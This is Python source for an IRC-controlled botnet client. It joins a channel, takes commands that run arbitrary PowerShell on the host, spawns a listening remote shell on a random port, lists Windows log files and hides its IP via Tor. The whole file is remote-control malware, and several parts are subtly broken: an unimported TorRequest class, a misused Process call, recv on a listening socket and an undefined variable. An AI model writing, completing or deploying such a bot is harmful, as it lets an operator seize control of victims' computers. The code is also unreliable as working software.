import pydle
from requests import get
from multiprocessing import Process
import socket
import random
import subprocess
import os, sys, time
import requests
import platform
import logging

#!/usr/bin/python3
# -*- coding: utf-8 -*-

logging.basicConfig(level=logging.ERROR)


def tor_identity():
    try:
        print("Loading new Tor identity ...")
        tr = TorRequest()
        response = requests.get("http://ipecho.net/plain")
        original_ip = response.text
        print("My Original IP Address:", original_ip)

        tr.reset_identity()  # Reset Tor identity
        response = tr.get("http://ipecho.net/plain")
        new_ip = response.text

        if original_ip == new_ip:
            print("Failed to change IP address.")
        else:
            print("New Ip Address", new_ip)
            return new_ip
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")


class MyOwnBot(pydle.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.shell_process = None

    async def on_connect(self):
        await self.join("#net")

    async def alert_msg(self, message):
        await self.message(target, message)

    async def on_message(self, target, source, message, ip):
        if message.startswith("!target "):
            message = message.replace("!target ", "")
            if message.startswith(ip):
                command = message.replace(ip, "")
                await self.message(target, "order received !")
                try:
                    p = subprocess.Popen(["powershell.exe", command], stdout=sys.stdout)
                    p.communicate()
                except Exception as e:
                    logging.error(f"An error occurred: {e}")

        if message == "!ip":
            await self.message(target, format(ip))

        if message == "!os":
            await self.message(target, getos())

        if message == "!spawn_shell":
            port = random.randint(1025, 3000)
            message = f"shell available on {ip}:{port}"
            await self.message(target, message)
            try:
                self.shell_process = Process(target=shell(port))
                self.shell_process.start()
            except Exception as e:
                logging.error(f"An error occurred: {e}")

        if message == "!stop_shell":
            if self.shell_process:
                self.shell_process.terminate()
                self.shell_process.join()
                message = "Shell stopped"
                await self.message(target, message)
            else:
                await self.message(target, "No shell process to stop")

        if message.startswith("!ps invoke"):
            command = message.replace("!ps invoke", "")
            try:
                PowershellInvoke.invoke(command)
            except Exception as e:
                logging.error(f"An error occurred: {e}")


class PowershellInvoke:
    def __init__(self, command):
        self.command = command

    @staticmethod
    def invoke(command):
        try:
            p = subprocess.Popen(
                ["powershell.exe", command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = p.communicate()
            if p.returncode != 0:
                logging.error(
                    f"Command failed with error code {p.returncode}: {stderr.decode()}"
                )
            else:
                print(stdout.decode())
        except Exception as e:
            logging.error(f"An error occurred while executing the command: {e}")


def shell(port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            hote = ""
            server.bind((hote, port))
            server.listen(5)
            server.accept()
            while True:
                message = server.recv(1024).decode("utf8")
                if message == "!stop":
                    server.send("Server stopping...".encode("utf8"))
                    break
                if message == "!getlog":
                    process = subprocess.Popen(
                        ["powershell", "Get-Childitem C:\\Windows\\*.log"],
                        stdout=subprocess.PIPE,
                    )
                    result = process.communicate()[0]
                    print(result)
    except OSError:
        logging.error("OSError occurred")


def getos():
    try:
        return platform.system()
    except Exception as e:
        logging.error(f"An error occurred while getting the OS: {e}")
        return None


def main():
    try:
        ip = tor_identity()
        client = MyOwnBot("BoBiBot", realname="bot")
        while True:
            try:
                client.run("localhost", tls=False, tls_verify=False)
            except Exception as e:
                logging.error(f"An error occurred while running the client: {e}")
                time.sleep(5)
    except Exception as e:
        logging.error(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
